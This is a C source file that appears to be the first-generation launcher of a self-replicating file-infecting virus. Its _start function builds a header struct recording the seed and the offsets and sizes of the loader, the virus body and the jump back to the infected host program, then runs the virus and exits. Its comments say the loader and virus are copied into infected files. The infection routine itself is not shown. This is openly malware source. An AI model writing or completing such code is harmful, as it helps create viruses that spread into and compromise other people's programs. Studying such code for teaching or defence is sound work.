#include "virus.h"
#include "syscalls.h"

void	loader_entry(void);
void	call_virus(void);
void	jump_back_to_client(void);
void	virus_header_struct(void);
void	loader_exit(void);

/*
** _start is the launcher function of the virus
**   - it is launched instead of the loader for the first run
**   - it is NOT copied into infected files (unlike the loader and virus)
*/
void	_start(void)
{
	// 1st generation values
	struct virus_header	vhdr = {
		.seed                = 0xfadedbade1f5eed5,
		.full_virus_size     = (size_t)_start - (size_t)loader_entry,
		.loader_entry        = loader_entry,
		.loader_size         = (size_t)loader_exit - (size_t)loader_entry,
		.dist_virus_loader   = (size_t)virus - (size_t)loader_entry,
		.dist_vircall_loader = (size_t)call_virus - (size_t)loader_entry,
		.dist_header_loader  = (size_t)virus_header_struct - (size_t)loader_entry,
		.dist_jmpclient_loader  = (size_t)jump_back_to_client - (size_t)loader_entry,
	};

	virus(&vhdr);

	sys_exit(0);
	__builtin_unreachable();
}
